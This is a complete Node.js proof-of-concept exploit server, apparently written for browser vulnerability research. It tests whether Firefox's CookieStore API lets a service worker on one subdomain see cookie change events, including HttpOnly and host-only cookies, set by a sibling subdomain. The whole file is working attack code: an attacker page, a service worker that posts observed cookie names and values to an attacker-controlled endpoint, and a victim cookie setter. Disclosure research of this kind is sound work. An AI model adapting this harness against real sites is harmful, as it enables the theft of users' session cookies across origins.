#!/usr/bin/env node
// CookieStore Sibling-Host Cookie Event Leak — PoC Server
// sn0x
//
// Setup:
//   echo "127.0.0.1 a.pwn.test b.pwn.test" | sudo tee -a /etc/hosts
//   node server.js
//
// Then open http://a.pwn.test:9001/ in Firefox.

"use strict";
const http = require("node:http");
const fs   = require("node:fs");
const path = require("node:path");

const PORT        = Number(process.env.PORT || 9001);
const ATTACKER    = `a.pwn.test:${PORT}`;
const VICTIM      = `b.pwn.test:${PORT}`;
const ATTACKER_ORIGIN = `http://${ATTACKER}`;
const VICTIM_ORIGIN   = `http://${VICTIM}`;

// In-memory event log (per session)
const events = [];

function ts() { return new Date().toISOString(); }

function log(msg) { process.stdout.write(`[${ts().slice(11,23)}] ${msg}\n`); }

// ─────────────────────────────────────────────────────────────────────────────
// HELPER: respond
// ─────────────────────────────────────────────────────────────────────────────
function send(res, status, body, type = "text/plain; charset=utf-8", extra = {}) {
  res.writeHead(status, {
    "Content-Type": type,
    "Cache-Control": "no-store",
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Headers": "Content-Type",
    ...extra,
  });
  res.end(body);
}

function json(res, obj, status = 200) {
  send(res, status, JSON.stringify(obj, null, 2), "application/json; charset=utf-8");
}

// ─────────────────────────────────────────────────────────────────────────────
// ATTACKER PAGES (served from a.pwn.test)
// ─────────────────────────────────────────────────────────────────────────────
const attackerIndex = () => `<!doctype html>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'">
<title>CookieStore Sibling Leak PoC — attacker (a.pwn.test)</title>
<style>
  body { font: 14px/1.6 monospace; background: #111; color: #ccc; margin: 24px; max-width: 860px; }
  h1 { color: #ff6; font-size: 16px; }
  h2 { color: #09f; font-size: 14px; margin-top: 20px; }
  .ok { color: #0f0; } .bug { color: #f44; font-weight: bold; }
  .warn { color: #ff0; } .info { color: #09f; }
  #status { border: 1px solid #444; padding: 10px; min-height: 40px; }
  #events { border: 1px solid #444; padding: 10px; white-space: pre-wrap; min-height: 60px; }
  #iframe-container { border: 1px dashed #555; padding: 5px; }
  iframe { border: 1px solid #333; width: 100%; }
  button { background: #222; color: #09f; border: 1px solid #09f; padding: 5px 12px; cursor: pointer; }
</style>
<h1>CookieStore Sibling-Host Cookie Event Leak — sn0x</h1>
<p>Attacker origin: <strong>${ATTACKER_ORIGIN}</strong></p>
<p>Victim origin: <strong>${VICTIM_ORIGIN}</strong></p>

<h2>Phase 1: Register Service Worker</h2>
<div id="status">Waiting…</div>

<h2>Phase 2: SW Subscriptions &amp; Victim Cookie Triggers</h2>
<p id="sub-status">SW not yet registered</p>

<h2>Phase 3: Cookie Change Events Received by SW</h2>
<p>(SW posts events here; refresh <a href="/events">/events</a> or poll below)</p>
<button onclick="fetchEvents()">Refresh Events</button>
<pre id="events">No events yet.</pre>

<h2>Victim iframe (loads after SW registered)</h2>
<div id="iframe-container"><em>Waiting for SW registration…</em></div>

<script>
const STATUS    = document.getElementById('status');
const SUB_STATUS = document.getElementById('sub-status');
const EVENTS_DIV = document.getElementById('events');
const IC        = document.getElementById('iframe-container');
let pollInterval;

function setStatus(msg, cls='') {
  STATUS.innerHTML = '<span class="' + cls + '">' + msg + '</span>';
}

async function fetchEvents() {
  const r = await fetch('/events');
  const data = await r.json();
  EVENTS_DIV.textContent = JSON.stringify(data, null, 2);

  // Highlight findings
  const findings = analyzeFindings(data.events || []);
  if (findings.length) {
    EVENTS_DIV.innerHTML += '\\n\\n<span class="bug">⚠ FINDINGS:\\n' +
      findings.map(f => '  ' + f).join('\\n') + '</span>';
  }
}

function analyzeFindings(evts) {
  const findings = [];
  for (const ev of evts) {
    for (const cookie of (ev.changed || [])) {
      if (cookie.name === 'victim_host_only') {
        findings.push('[SCENARIO 1 — HIGH] Host-only cookie observed by a.pwn.test SW: ' +
          'name=' + cookie.name + ' value=' + cookie.value);
      }
      if (cookie.name === 'victim_httponly') {
        findings.push('[SCENARIO 2 — CRITICAL] HttpOnly cookie NAME visible in SW event: ' +
          'name=' + cookie.name + (cookie.value ? ' value=' + cookie.value : ' (value missing/redacted)'));
      }
      if (cookie.name === 'victim_httponly_shared') {
        findings.push('[SCENARIO 2b — CRITICAL] HttpOnly shared-domain cookie in SW event: ' +
          'name=' + cookie.name);
      }
      if (cookie.name === 'victim_shared') {
        findings.push('[SCENARIO 3 — INFO] Shared-domain cookie in SW event (expected per spec): ' +
          'name=' + cookie.name);
      }
    }
    for (const cookie of (ev.deleted || [])) {
      if (cookie.name === 'victim_host_only') {
        findings.push('[SCENARIO 1 — HIGH] Host-only DELETE event observed by a.pwn.test SW');
      }
    }
  }
  return findings;
}

async function registerSW() {
  if (!('serviceWorker' in navigator)) {
    setStatus('ServiceWorker API not available in this context', 'warn');
    return;
  }
  if (!('CookieStoreManager' in window || 'cookies' in ServiceWorkerRegistration.prototype)) {
    setStatus('CookieStoreManager not available — Firefox version may not support SW cookie subscriptions', 'warn');
    // Try CookieStore change events directly (non-SW path) as fallback
    await testDirectCookieStore();
    return;
  }

  setStatus('Registering service worker…', 'info');
  try {
    const reg = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
    setStatus('SW registered: ' + reg.scope, 'ok');

    // Wait for SW to be active
    if (reg.installing) {
      await new Promise(resolve => {
        reg.installing.addEventListener('statechange', function handler() {
          if (this.state === 'activated') { resolve(); this.removeEventListener('statechange', handler); }
        });
      });
    }
    if (reg.waiting) {
      reg.waiting.postMessage({ type: 'SKIP_WAITING' });
      await new Promise(r => setTimeout(r, 500));
    }

    await navigator.serviceWorker.ready;
    setStatus('SW active — subscribing to cookie changes…', 'ok');

    // Subscribe to cookie changes
    // The critical test: we subscribe for ALL cookies visible to our origin.
    // If Firefox uses eTLD+1-level matching instead of strict origin matching,
    // we'll receive events for b.pwn.test's host-only cookies too.
    await subscribeToChanges(reg);

  } catch (e) {
    setStatus('SW registration failed: ' + e.message, 'warn');
    console.error(e);
  }
}

async function subscribeToChanges(reg) {
  try {
    // Subscribe: no name filter = any cookie visible to our scope
    const current = await reg.cookies.getSubscriptions();
    if (current.length === 0) {
      await reg.cookies.subscribe([
        // Test 1: subscribe for any cookie at our exact origin
        { name: undefined },
        // Note: the CookieStore API doesn't expose a "domain" subscription filter;
        // we get events for all cookies accessible to the SW's scope.
        // The bug: "accessible to scope" may be computed incorrectly.
      ]);
    }
    const subs = await reg.cookies.getSubscriptions();
    SUB_STATUS.innerHTML = '<span class="ok">SW subscribed: ' + JSON.stringify(subs) + '</span>';

    // Phase 2: load victim iframe to trigger cookies
    IC.innerHTML = '<iframe src="' + ${JSON.stringify(VICTIM_ORIGIN)} + '/set" height="200"></iframe>';
    setStatus('Victim iframe loaded — waiting for cookie events…', 'info');

    // Poll for events
    pollInterval = setInterval(fetchEvents, 1500);
    setTimeout(() => clearInterval(pollInterval), 30000);

  } catch (e) {
    SUB_STATUS.innerHTML = '<span class="warn">SW cookie subscription failed: ' + e.message +
      ' (Firefox may not yet support CookieStoreManager — testing CookieStore direct events)</span>';
    await testDirectCookieStore();
  }
}

// Fallback: CookieStore change events directly on the document (non-SW)
// Tests whether document-level CookieStore on a.pwn.test sees b.pwn.test cookies.
async function testDirectCookieStore() {
  if (!('cookieStore' in window)) {
    setStatus('cookieStore not available — enable dom.cookiestore.enabled in about:config', 'warn');
    return;
  }
  setStatus('Testing direct cookieStore.onchange events…', 'info');
  cookieStore.addEventListener('change', (event) => {
    const payload = {
      type: 'direct-cookiestore-change',
      changed: event.changed?.map(c => ({ name: c.name, value: c.value, domain: c.domain, path: c.path, secure: c.secure, sameSite: c.sameSite })),
      deleted: event.deleted?.map(c => ({ name: c.name, domain: c.domain })),
      timestamp: new Date().toISOString(),
    };
    console.log('cookieStore change event:', payload);
    // Report to server
    fetch('/sw-event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    }).catch(() => {});
    fetchEvents();
  });

  // Load victim iframe
  IC.innerHTML = '<iframe src="' + ${JSON.stringify(VICTIM_ORIGIN)} + '/set" height="200"></iframe>';
  setStatus('Direct CookieStore listener active — victim iframe loaded.', 'ok');
  pollInterval = setInterval(fetchEvents, 1500);
  setTimeout(() => clearInterval(pollInterval), 30000);
}

// Listen for messages from SW
navigator.serviceWorker?.addEventListener('message', e => {
  console.log('Message from SW:', e.data);
  fetchEvents();
});

registerSW();
</script>`;

// ─────────────────────────────────────────────────────────────────────────────
// SERVICE WORKER (served from a.pwn.test/sw.js)
// ─────────────────────────────────────────────────────────────────────────────
const swCode = `
// CookieStore SW — a.pwn.test
// Reports any cookie change events back to the PoC server.
const REPORT_URL = '${ATTACKER_ORIGIN}/sw-event';

self.addEventListener('message', e => {
  if (e.data?.type === 'SKIP_WAITING') self.skipWaiting();
});

self.addEventListener('activate', e => {
  e.waitUntil(clients.claim());
});

self.addEventListener('cookiechange', event => {
  const payload = {
    type: 'sw-cookiechange',
    swScope: self.registration.scope,
    changed: (event.changed || []).map(c => ({
      name: c.name,
      value: c.value,          // if HttpOnly, should be undefined/missing
      domain: c.domain,
      path: c.path,
      secure: c.secure,
      sameSite: c.sameSite,
      httpOnly: c.httpOnly,    // should be absent for HttpOnly (they shouldn't appear at all)
    })),
    deleted: (event.deleted || []).map(c => ({
      name: c.name,
      domain: c.domain,
      path: c.path,
    })),
    timestamp: new Date().toISOString(),
  };

  console.log('[SW] cookiechange event:', payload);

  // Post to the PoC server for analysis
  fetch(REPORT_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  }).catch(e => console.error('[SW] report failed:', e));

  // Also post message to all clients
  clients.matchAll().then(all => all.forEach(c => c.postMessage(payload)));
});
`;

// ─────────────────────────────────────────────────────────────────────────────
// VICTIM PAGE (served from b.pwn.test)
// Sets three classes of cookies and reports what it set.
// ─────────────────────────────────────────────────────────────────────────────
const victimSetPage = () => `<!doctype html>
<meta charset="utf-8">
<title>Victim page (b.pwn.test) — setting cookies</title>
<style>body { font: 13px monospace; background: #1a1a1a; color: #ccc; padding: 16px; }</style>
<h3>b.pwn.test — cookie setter</h3>
<p>Setting test cookies and reporting. Check <a href="${ATTACKER_ORIGIN}/events" target="_top">attacker events</a>.</p>
<script>
const VICTIM  = location.origin;          // http://b.pwn.test:9001
const ATTACKER = "${ATTACKER_ORIGIN}";

function setLog(msg) {
  document.body.innerHTML += '<p>' + msg + '</p>';
}

async function setCookiesAndReport() {
  setLog('Setting cookies via document.cookie and reporting...');

  // ── Scenario 1: host-only cookie (domain = b.pwn.test, set by JS) ──────────
  // No domain attribute → host-only. a.pwn.test's SW should NOT see this.
  document.cookie = 'victim_host_only=SECRET_HOST_ONLY_VALUE; Path=/; SameSite=Lax';
  setLog('Set: victim_host_only (host-only, JS, b.pwn.test only)');

  // Small delay so events have time to fire
  await new Promise(r => setTimeout(r, 300));

  // ── Scenario 3: shared-domain cookie ──────────────────────────────────────
  // domain=.pwn.test → accessible to both a.pwn.test and b.pwn.test
  // SW at a.pwn.test SHOULD get an event (correct per spec)
  document.cookie = 'victim_shared=SHARED_DOMAIN_VALUE; Domain=.pwn.test; Path=/; SameSite=Lax';
  setLog('Set: victim_shared (domain=.pwn.test — a.pwn.test should see this)');

  await new Promise(r => setTimeout(r, 300));

  // ── Trigger server-set HttpOnly cookies via fetch ─────────────────────────
  // Can't set HttpOnly via document.cookie (browser ignores it). Must go via server.
  setLog('Requesting server to set HttpOnly cookies...');
  try {
    const r = await fetch(VICTIM + '/set-httponly', { credentials: 'include' });
    const text = await r.text();
    setLog('Server set HttpOnly cookies: ' + text);
  } catch(e) {
    setLog('fetch /set-httponly failed: ' + e.message);
  }

  await new Promise(r => setTimeout(r, 500));

  setLog('Done setting cookies. Check attacker events.');
}

setCookiesAndReport();
</script>`;

// ─────────────────────────────────────────────────────────────────────────────
// HTTP SERVER
// ─────────────────────────────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const host = (req.headers.host || "").toLowerCase();
  const url  = new URL(req.url, `http://${host}`);
  const path = url.pathname;

  log(`${req.method} ${host}${path}`);

  // OPTIONS pre-flight
  if (req.method === "OPTIONS") { send(res, 204, ""); return; }

  // ── ATTACKER ORIGIN (a.pwn.test) ─────────────────────────────────────────
  if (host === ATTACKER) {

    if (path === "/" && req.method === "GET") {
      send(res, 200, attackerIndex(), "text/html; charset=utf-8");
      return;
    }

    if (path === "/sw.js" && req.method === "GET") {
      send(res, 200, swCode, "application/javascript; charset=utf-8", {
        "Service-Worker-Allowed": "/",
      });
      return;
    }

    if (path === "/events" && req.method === "GET") {
      const summary = events.map(e => ({
        ...e,
        findings: analyzeEvent(e),
      }));
      json(res, { count: events.length, events: summary });
      return;
    }

    if (path === "/sw-event" && req.method === "POST") {
      let body = "";
      req.on("data", d => body += d);
      req.on("end", () => {
        try {
          const ev = JSON.parse(body);
          ev.receivedAt = ts();
          events.push(ev);
          log(`  COOKIE EVENT received at ${ATTACKER}:`);
          log(`    type=${ev.type} changed=${JSON.stringify(ev.changed)} deleted=${JSON.stringify(ev.deleted)}`);
          const findings = analyzeEvent(ev);
          for (const f of findings) log(`  *** FINDING: ${f}`);
        } catch {}
        send(res, 204, "");
      });
      return;
    }

    if (path === "/reset" && req.method === "POST") {
      events.length = 0;
      send(res, 200, "reset\n");
      return;
    }

    send(res, 404, "not found\n");
    return;
  }

  // ── VICTIM ORIGIN (b.pwn.test) ───────────────────────────────────────────
  if (host === VICTIM) {

    if (path === "/set" && req.method === "GET") {
      send(res, 200, victimSetPage(), "text/html; charset=utf-8");
      return;
    }

    if (path === "/set-httponly" && req.method === "GET") {
      // Scenario 2: HttpOnly cookie — host-only (domain=b.pwn.test implicit)
      // JS cannot set or read these. If they appear in SW events, it's critical.
      const cookies = [
        // HttpOnly host-only — strictly b.pwn.test only
        `victim_httponly=SECRET_HTTPONLY_VALUE; Path=/; HttpOnly; SameSite=Lax`,
        // HttpOnly shared-domain — .pwn.test accessible to both, but still HttpOnly
        `victim_httponly_shared=SECRET_HTTPONLY_SHARED; Domain=.pwn.test; Path=/; HttpOnly; SameSite=Lax`,
      ];
      res.writeHead(200, {
        "Content-Type": "text/plain",
        "Set-Cookie": cookies,
        "Access-Control-Allow-Origin": ATTACKER_ORIGIN,
        "Access-Control-Allow-Credentials": "true",
      });
      res.end("set httponly cookies\n");
      return;
    }

    // Also serve the victim page index for direct visits
    if (path === "/" && req.method === "GET") {
      send(res, 200, `<!doctype html><title>b.pwn.test</title>
        <body style="font:monospace;background:#111;color:#ccc;padding:16px">
        <h3>b.pwn.test (victim)</h3>
        <a href="/set">Go to cookie setter</a></body>`, "text/html");
      return;
    }

    send(res, 404, "not found\n");
    return;
  }

  // ── Unknown host ─────────────────────────────────────────────────────────
  send(res, 200, `<!doctype html><title>CookieStore PoC</title>
    <body style="font:monospace;background:#111;color:#ccc;padding:24px">
    <h2>CookieStore Sibling-Host PoC</h2>
    <p>Add to /etc/hosts: <code>127.0.0.1 a.pwn.test b.pwn.test</code></p>
    <ul>
      <li>Attacker: <a href="${ATTACKER_ORIGIN}/">${ATTACKER_ORIGIN}/</a></li>
      <li>Victim: <a href="${VICTIM_ORIGIN}/set">${VICTIM_ORIGIN}/set</a></li>
    </ul></body>`, "text/html");
});

// ─────────────────────────────────────────────────────────────────────────────
// EVENT ANALYSIS
// ─────────────────────────────────────────────────────────────────────────────
function analyzeEvent(ev) {
  const findings = [];
  for (const c of (ev.changed || [])) {
    if (c.name === "victim_host_only") {
      findings.push(
        `[SCENARIO 1 — HIGH] Host-only b.pwn.test cookie observed by a.pwn.test: ` +
        `name=${c.name} value=${c.value} domain=${c.domain}`
      );
    }
    if (c.name === "victim_httponly") {
      findings.push(
        `[SCENARIO 2 — CRITICAL] HttpOnly cookie in SW change event: ` +
        `name=${c.name} value=${c.value ?? "(REDACTED)"} domain=${c.domain}`
      );
    }
    if (c.name === "victim_httponly_shared") {
      findings.push(
        `[SCENARIO 2b — CRITICAL] HttpOnly shared-domain cookie in SW event: ` +
        `name=${c.name} value=${c.value ?? "(REDACTED)"}`
      );
    }
    if (c.name === "victim_shared") {
      findings.push(`[SCENARIO 3 — INFO] Shared-domain cookie event (expected): name=${c.name}`);
    }
  }
  for (const c of (ev.deleted || [])) {
    if (c.name === "victim_host_only") {
      findings.push(`[SCENARIO 1 — HIGH] Host-only DELETE event observed at a.pwn.test`);
    }
  }
  return findings;
}

server.listen(PORT, "0.0.0.0", () => {
  log(`PoC server running on port ${PORT}`);
  log(`Attacker: ${ATTACKER_ORIGIN}/`);
  log(`Victim:   ${VICTIM_ORIGIN}/set`);
  log(`Events:   ${ATTACKER_ORIGIN}/events`);
  log("");
  log("Setup: echo '127.0.0.1 a.pwn.test b.pwn.test' | sudo tee -a /etc/hosts");
  log("Then open Firefox and navigate to: " + ATTACKER_ORIGIN + "/");
});
